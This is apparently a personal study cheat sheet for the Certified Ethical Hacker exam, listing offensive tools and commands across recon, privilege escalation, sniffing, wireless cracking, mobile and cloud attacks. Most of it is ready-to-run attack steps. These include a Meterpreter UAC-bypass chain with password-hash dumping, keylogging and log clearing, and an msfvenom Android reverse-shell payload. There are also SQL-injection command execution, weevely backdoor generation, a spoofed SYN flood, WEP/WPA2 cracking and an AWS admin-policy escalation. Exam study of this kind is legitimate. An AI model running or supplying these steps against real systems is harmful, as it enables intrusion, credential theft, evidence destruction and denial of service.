# cehPrep

************************************************
#Recon
video Search: citizenevidence.amnestyusa.org
ftp search: www.searchftps.net
iot search: www.shodan.io
subDomain: www.netcraft.com, resource -> report -> select domain to get subdomains
		 | (Linux) theHarvester -d <domain>
PeopleSearch: peekyou.com, followerwonk.com
PassiveFootprinting: censys.io/domain?q=<>
mirrorWebsite: HTTrack
gatherWordList: Cewl, (gather) $ cewl -d 2 -m 5 <site> -w <name>
DNS Footprinting: nslookup, set type=a(get domain ip), set type=ctype(host where domain is registered) | Kloth.net | yougetsignal.com -> reverse IP Domain check

/* recon-ng */
> workspaces
> workspace create <name>
> db insert domains
> <domain> (to add scope)
> modules load recon/domains-hosts/brute_hosts
> run (harvests all subdomain using brute_hosts)

> modules load recon/hosts-hosts/reverse_resolve
> run

> modules load reporting/html (creates html report)

impModule
- recon/doamins-contacts/whois_pocs: contacts related to domain
- recon/profiles-profiles/profiler: checks profile
//----//

/* Nmap */
-sX: Xmas | No response(open), RST(closed)
-sM: Maimon | No response(open/filtered), RST(closed)
-sA: ACK | No response(filtered), RST(no firewall)
-sU: UDP | no reposnse(open), unreachable(closed)
-sP: Ping Sweep
-sI <zombieIP><target>: zombie scan using zombie IP
--data 0xdeadbeef: sende binary data to bypass IDS/Firewall
--script http-enum <site>: site enum
--script hostmap-bfk -script-args hostmap-bfk.prefix=hostmap- <site>
--script http-waf-detect

//----//

- Colasoft packet builder: creating packet
- ProxySwitcher: browse anonymously
- Network Topology Mapper: mapping network
- snmp-check: snmp enum
- rpc-scan.py: rpc enum
- dig <nameServer><domain> axfr: zone transfer of domain
- nslookup -> ls -d <nameServer>: zone transfer of ns
- enum4linux -u <usrname> -p <pswd> <IP>: samba enum

device name: nbstat -A <ip>
null session: 1. net use \\<ip>\e ""\user:""
2. net use \\<ip>\e ""/user:""

exploit snmp(msf):
1. auxillary/scanner/snmp/snmp_login
2. auxillary/scanner/snmp/snmp_enum

active directory explorer

enum4linux -u <usrname> -p <pass> <ip> -o(os detection) -P(pswd policy) -G(groups) -S(share policy)

nikto -h <url> Tuning 1

Recon: skipfish
skipfish -o /root/test -S /root/share/dictionaries/complete.wl http://<ip>

********************************
#System Hacking

- FatRat: create files that gives shell when opened, bypass most antivirus
	. execute permission to fatrat, setup.sh, powerfull.sh

- responder.py: LLMNR and NBT-NS are enabled by default(win), act as original server and create connection with clients to get pass.
	. add executable permission to .py
	. > sudo responder.py -I <interface>


********************************

# PrevEsc

- PowerSploit: github.com/PowerShellMafia/PowerSploit (recon for vuln privesc way)
	. upload PowerSploit/Privesc/PowerUp.ps1
	. powershell -ExecutionPolicy Bypass -Command ". .PowerUp.ps1;Invoke-AllChecks"
- BeRoot.exe
/* Meterpreter*/
- getsystem -t 1
	. if fails
		.. background session
		.. use exploit/windows/local/bypassuac_fodhelper
		.. set SESSION 1 (param in exploit set to backgroud meterpreter)
		.. set payload window/meterpreter/reverse_tcp
		.. set lhost, target=0
		.. exploit. Next "getuid" to check priv in meterpreter
		.. getsystem -t -1(for SYSTEM priv)
		.. run post/windows/gather/smart_hashdump
		.. "clearev" to clear logs
- to change "Modified, Accessed, Created or entry modified value" of file in meterpreter: timestomp <file> -m(fore modified) "<value>"
- keyscan start. Then to see keylogger capture: keyscan dump
- idletime
- shutdown
- search -f <file>
/*--*/

- Hide file NTF
	. type foo.txt > bar.exe:foo.txt
	. del foo.txt
	. mklink exploit.exe bar.exe:foo.txt
	. exploit.exe and will run foo.txt although it will not be shown in dir since deleted


encrypt file: CryptoForge

MeterPreter: run vnc (see client's window on screen)
run post/windows/gather/smart_hashdump
-winPrevEsc use exploit/windows/local/bypassuac_fodhelpfer
-Keylogger: keyscan_start, keyscan_dump

Stegnography: 
-Text
snow -C -m "<msg>" -p "<pass>" <file to be added as input> <final output file>
snow -C -p "<pass>" <file to decrypt>
-Image
OpenStego, QuickStego

Covert_TCP: Secret message Transmission by replacing parts of header, one character at a time per packet

- Auditpol /clear /y: clear logging policies
- wevutil el(enumLog). OR wevutil cl system: clear logs
- history -c, OR shred ~/.bash_history: clear command history. export HISTSIZE=0: setting history size

/* Malware */
- nJRAT (auto connect even after restart)
- ProRAT (attach to a file and then establish connection)
- Theef RAT
- JPS Virus Maker
/*--*/

/* Malware Analysis */
- BinText: extracts strings
- dependency walker
- IDA
- OllyDbg
VulnScanner: Nessus, Nikto, Vega, Acunetix, N-Stalker

WPScan: wpscan -u http://<ip> --enumerate vp(vuln plugins)

Spawn shell using sql Injection: exec master..xp_cmdshell '<command>'; -- -



sqlmap: 
1.sqlmap -u <url> --cookie=""(only if you are using sessioned connection) --db
2.sqlmap -u <url> --cookie=""(only if you are using sessioned connection) -D <dbname> --tables
3. sqlmap -u <url> --cookie=""(only if you are using sessioned connection) -D <dbname> -T <tableName> --columns/--dump

reverse shell:
1. windows: windows/meterpreter/reverse_tcp
1. Linux: linux/x86/shell/reverse_tcp
Metasploit meterpreter shell
multi/handler: attach win/linux payload

******************************
/* Monitoring */
- TCPView, CurrPorts, Procmon, autoruns, winPatrol
- Regshot
******************************
/* Sniffing */
- yersnia: for DHCP starvation
- arpspoof: for arp poisoning
	. arpspoof -i eth0 -t <gateway or accessPoint> <target>: tells gateway target has our MAC

/* Detect ARP Spoof */
- Wireshark
	. preferences > Detect duplicate IP
	. start capture
	. Analyse > Expert ***
	. Look for "Duplicate IP"
	. Select packet to see the details in Expert Analysis window
- XArp
	. Install and it will detect automatically
/*--*/

/* Sniffer Detect */
- nmap
	. nmap --script sniffer-detect <ip>
* NetScanTool
	. Manual tool > promiscuous mode 
/*--*/

/* Social Engg */
- SET
	. gihub.com/trustedsec/social-engineer-toolkit
	. cd setoolkit
	. pip3 install -r requirements.txt
	. chmod +x setoolkit
	. ./setoolkit
- shellphish
	. github.com/rorizam323/shellphish
/*--*/
# Enumeration
/// NetBIOS extraction: 
- Username from emailid
- information using default passwords
- bruteforce active dir
- dns zone transfer
- usergrp from windows
- username from SNMP

nbstat: netbios enum tool
pstools: user enum tool
netview: list of shared resources

/* DoS */
- Metasploit
	. use auxillary/dos/tcp/synflood
	. set rhost, rport, sport(spoofable port, default random)
- hping3
	. hping3 -S(syn) <target> -a <spoofableIP> -p <port> --flood
	. to use UDP, instead of -S use -2
	. udp can be used to exploit: voip, ntp, rpc, netbios, tftp, snmpv2
/*--*/
************************************
/* Site enum */
- uniscan: directory scan
	. uniscan -u http://<> -we(file check)|-q(directory|)
- gobuster
	. gobuster dir -u <url> -w <wordlist>
- Vega
- weevely: generates backdoor
	. weevely generate <pswd> <o/p path>
	. upload shell
	. weevely <url> <pswd>
/*--*/

/* Check loadbalancer */
-lbd <site>
-dig <Site>
/*--*/

/// SNMP
2 pswd: public to read config, private to remote edit config
SNMP Enum: used to obtain hosts, routes, routing table, shares etc

Tool: snmpcheck, softperfect network scanner, netwrok performace monitor, oputils, prtg network monitor, engineer's toolset

/// NTP
Tools: ntptrace, ntpdc, ntpq, nmap

/// NFS
Tools: rpcscan, superenum

*************************
/* Wireless Hacking */
- airmon-ng
	. airmon-ng start wlan0
	. airmon-ng check kill: to kill processes interfering
	. wash -i wlan0mon

	. airodump-ng wlan0mon: list of detected access point
	. airodump-ng --bssid <bssid> wlan0mon
	. airplay-ng --deauth 15(# of death packets) -a <accessPoint BSSID> -c <clientBSSID> wlan0mon
- wifiphisher --force-hostapd

/*WEP Crack*/
	. airmon-ng start wlan0
	. airodump-ng wlan0mon
	. airodump-ng wlan0mon --encrypt wep: only search for WEP(optional)
	. aireplay-ng -9 -e <accessPoint> -a <BSSID> wlan0mon: inject packet
	. airodump-ng --bssid <bssid> -c 1 -w WEPcrack wlan0mon: capture Initialization Vector
	. aireplay-ng -3 -b <bssid> -h <station> wlan0mon: generate arp traffic
	. aircrack-ng WEPcrack-01.cap

/*--*/
/* WPA Crack */
- Fern
/*--*/
/* WPA2 Crack */
	. airmon-ng start wlan0mon
	. airdump-ng wlan0mon
	. airdump wlan0mon --bssid <bssid> -c(channel) <. -w <dumpFileIV> wlan0mon
	. aireplay-ng -0(deauth mode) 11(deauth packet) -a <bssid> -c <station> wlan0mon
	. aircrack-ng -a2(mode 2: WPA|PSK) <bssid> -w <wordlist> 
- Mana
	. /etc/mana-toolkit/hostapd-mana.config
	. change ssid and interface(phy)
	. bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh: create rogue accessPoint
/*--*/
*************************
/* Mobile Hacking */
- msfvenom
	. msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik lhost=<> R > destPath
	. share/upload/deliver to client
	. msfconsole
	. use exploit/multi/handler
	. exploit -j -z
- PhoneSploit: various action on connected phone
	. python3 phonesploit.py
- AVC UnDroid: Analyse apk
	. visit undroid.av-comparatives.org, upload apk to get report
- Quixxi
	. vulnerabilitytest.quixxi.com/#/
*************************
/* Cloud Security */
- lazys3: generate list of s3 directory wordlist
	. ruby lazys3.rb <company>(optional)
- s3scanner.py: scans if se bucket is open
	. python ./s3scanner.py urlOfS3_wordlist.txt: result in default bucket.txt	
- AWS
	. policy: {"version": "2012-10-17","statement": [{"Effect": "Allow","Action": "'","Resource": "'"}]}
	. aws iam create-policy --policy-name user-policy --policy-document file://<json file>: gives admin priv to IAM based on policy
	. aws iam attach-user-policy --user-name <targetUser> --policy-arn arn:aws:iam::<acID>:policy/user-policy: attach user-policy to user
	. aws iam list-users: lists all users if priv is escalated
*************************
/* Ecryption */
- cryptoforge
- advanced encryption package
- bcTextEncoder
- VeraCrypt: whole encrypted drive
- BitLocker: whole encrypted drive
*************************
*************************

Tool to review
- nmap
- hydra
- john
- zap
- aircrack-ng
- pluma
